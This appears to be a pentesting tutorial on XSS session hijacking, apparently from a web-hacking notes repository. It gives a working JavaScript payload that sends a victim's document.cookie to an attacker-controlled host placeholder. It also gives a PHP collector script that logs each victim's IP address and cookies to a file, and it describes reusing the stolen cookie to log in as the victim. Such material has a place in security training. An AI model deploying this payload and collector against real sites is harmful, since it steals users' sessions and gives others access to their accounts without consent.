# XSS Session Hijacking.
Modern web applications use cookies to maintain a user's session across different browsing sessions. This allows the user to log in only once and keep their session active even if they visit the same 
website at a different time or date. However, _if a malicious user __obtains the cookie data from the victim's browser__, they could __access the victim's logged-in session without knowing their credentials__._
With the ability to execute JavaScript code in the victim's browser, we could collect their cookies and send them to our server to hijack their logged-in session through a session hijacking attack 
(also known as cookie hijacking).

## Attack overview.
It requires a JavaScript payload to send us the necessary data and a PHP script hosted on our server to capture and analyze the transmitted data.
We will need to create two files to perform this attack: 
1. [script.js](#script.js), this script should point to index.php to send us the necessary data.
2. [index.php](#index.php), it will capture and analyze the transmitted data. It will create a cookie file to store all the cookies we can find.
3. Additionally, we need an effective payload that we must modify to point to script.js.<br />
Once we find a working XSS payload and identify the vulnerable input field, we can proceed with the XSS exploitation and perform a session hijacking attack.


### script.js
```javascript
new Image().src='http://<OUR_IP>/index.php?c='+document.cookie;
```

### index.php
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

## XSS Hijacking Exploitation.
![10](https://github.com/PentesterArchive/Hacking-Web/assets/161533623/250b8be7-ad3e-481b-a8ec-814de2ddfe70)
Now, we wait for the victim to visit the vulnerable page and see our XSS payload. Once they do, we will receive two requests on our server: one for script.js, which will 
make another request with the cookie value:
![12](https://github.com/PentesterArchive/Hacking-Web/assets/161533623/3d74f9ac-ca03-4ffa-87db-b27ebdc93630)


As we mentioned earlier, we get the cookie value directly in the terminal, as we can see. However, since we prepared a PHP script (index.php), we also get the cookies.txt file with a 
clean record of the cookies.<br />
![13](https://github.com/PentesterArchive/Hacking-Web/assets/161533623/875869a5-4ad3-4581-b882-9a5d63b028a3)

Finally, we can use this cookie on the login.php page to access the victim's account.

![16](https://github.com/PentesterArchive/Hacking-Web/assets/161533623/e25a479f-2733-492d-b368-088d219502d4)

![17](https://github.com/PentesterArchive/Hacking-Web/assets/161533623/e62aee6b-29d1-4826-9265-ded3dd3bc957)


